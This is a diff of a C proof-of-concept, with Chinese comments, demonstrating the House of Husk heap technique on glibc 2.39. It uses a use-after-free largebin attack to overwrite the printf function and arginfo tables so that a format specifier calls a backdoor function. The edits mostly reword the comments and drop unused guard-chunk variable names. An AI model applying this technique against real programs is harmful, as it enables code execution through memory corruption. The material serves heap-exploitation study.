@@ -1,19 +1,29 @@
 /*
- * 中文阅读提示：glibc 2.39：注意发行版补丁级不同也可能导致偏移变化。
- * 漏洞模型是 UAF 改 bk_nextsize；成功判据是两张 printf handler 全局指针
- * 都被写成受控 heap chunk，随后格式说明符索引到 backdoor。
- * 运行前必须用 readelf/nm/debug symbols 重算 MAIN_ARENA、PRINTF_* 偏移；
- * 同为 glibc 2.xx 并不保证作者给出的发行版偏移可直接使用。
+ * 中文导读：本文件针对 glibc 2.39，注意即使是同一大版本，发行版的补丁
+ * 级别不同也可能导致偏移变化。
  *
- * 分阶段阅读：
- *   1. 分配两组同 largebin 内“一大一小”的 chunk，并用 guard 隔开；
- *   2. free 大块后从 unsorted fd 泄露 main_arena，反算 libc 基址；
- *   3. 第一轮改大块 bk_nextsize，把小块地址写到 __printf_function_table；
- *   4. 第二轮把带有 callback 的 fake table 写到 __printf_arginfo_table；
- *   5. printf 解析指定格式符时按字符索引两张表，命中 backdoor。
+ * 漏洞模型：一次 UAF，用来改写 largebin chunk 的 bk_nextsize。
+ * 成功判据：__printf_function_table 和 __printf_arginfo_table 这两个
+ * 全局指针都被改写成受控的 heap chunk 地址，随后 printf 按格式说明符查表
+ * 时会命中我们放的 backdoor。
  *
- * 代码中的 p1[3] 是用户区起算第 4 个 qword，对应 chunk header 的
- * bk_nextsize；target-0x20 来自 largebin 插入时写 bk_nextsize->fd_nextsize。
+ * 运行前需要用 readelf/nm/调试符号重新计算 MAIN_ARENA、PRINTF_* 的偏移；
+ * 同是 glibc 2.39，不同发行版的偏移也可能不同，不能直接照抄本文件写死
+ * 的值。
+ *
+ * 阅读顺序：
+ *   1. 在同一个 largebin 里分配一大一小两个 chunk，中间用 guard 隔开；
+ *   2. free 大 chunk，从 unsorted 链表的 fd 泄露 main_arena，据此反算出
+ *      libc 基址；
+ *   3. 第一轮改写大 chunk 的 bk_nextsize，把小 chunk 的地址写进
+ *      __printf_function_table（第一张表）；
+ *   4. 第二轮把带 callback 的伪表地址写进 __printf_arginfo_table（第二张表）；
+ *   5. printf 解析到指定格式符时，会按字符索引这两张表，最终调用到我们
+ *      放的 backdoor 函数。
+ *
+ * 代码里的 p1[3] 是从用户区数起的第 4 个 qword，对应 chunk header 里的
+ * bk_nextsize 字段；target-0x20 是因为 largebin 插入时会把新值写到
+ * bk_nextsize->fd_nextsize，而 fd_nextsize 位于伪造 chunk 头的 +0x20 处。
  */
 /*
  * 标题：现代 glibc 上通过 Largebin Attack 实现 House of Husk。
@@ -62,18 +72,18 @@ int main(void)
 
 	size_t *p1 = malloc(0x428);
 
-	size_t *g1 = malloc(0x18);  // 保护块隔开第一组 p1 与 p2，防止释放时合并。
+	malloc(0x18);  // 保护块隔开第一组 p1 与 p2，防止释放时合并。
 
 	size_t *p2 = malloc(0x418);
 
-	size_t *g2 = malloc(0x18);   // 保护块隔开 p2 与下一组 large chunk。
+	malloc(0x18);   // 保护块隔开 p2 与下一组 large chunk。
 
 	size_t *p3 = malloc(0x488);
 
-	size_t *g3 = malloc(0x18);  // 保护块隔开第二组 p3 与 p4。
+	malloc(0x18);  // 保护块隔开第二组 p3 与 p4。
 	size_t *p4 = malloc(0x478);
 
-	size_t *g4 = malloc(0x18);  // 尾部保护块防止 p4 与 top 合并。
+	malloc(0x18);  // 尾部保护块防止 p4 与 top 合并。
 
 	free(p1);
 
@@ -81,13 +91,13 @@ int main(void)
 	// unsorted fd 指向 main_arena+0x60；减去对应 Build ID 的偏移即可得到 libc 基址。
 	libc_base = *p1 - MAIN_ARENA - MAIN_ARENA_DELTA;
 
-	size_t *g5 = malloc(0x438);
+	malloc(0x438);
 
 	free(p2);
 
 	p1[3] = (size_t)(libc_base + PRINTF_FUNCTION_T- 0x20);
 
-	size_t *g6 = malloc(0x438);
+	malloc(0x438);
 
 	assert((size_t)(p2-2) == *(size_t *)(libc_base+PRINTF_FUNCTION_T));
 
@@ -96,12 +106,12 @@ int main(void)
 	*(size_t *)(p4 + ('X' - 2)) = backdoor_addr;
 
 	free(p3);
-	size_t *g7 = malloc(0x498);
+	malloc(0x498);
 	free(p4);
 
 	p3[3] = (size_t)(libc_base + PRINTF_ARGINFO_T- 0x20);
 
-	size_t *g8 = malloc(0x498);
+	malloc(0x498);
 
 	assert((size_t)(p4-2) == *(size_t *)(libc_base+PRINTF_ARGINFO_T));
 
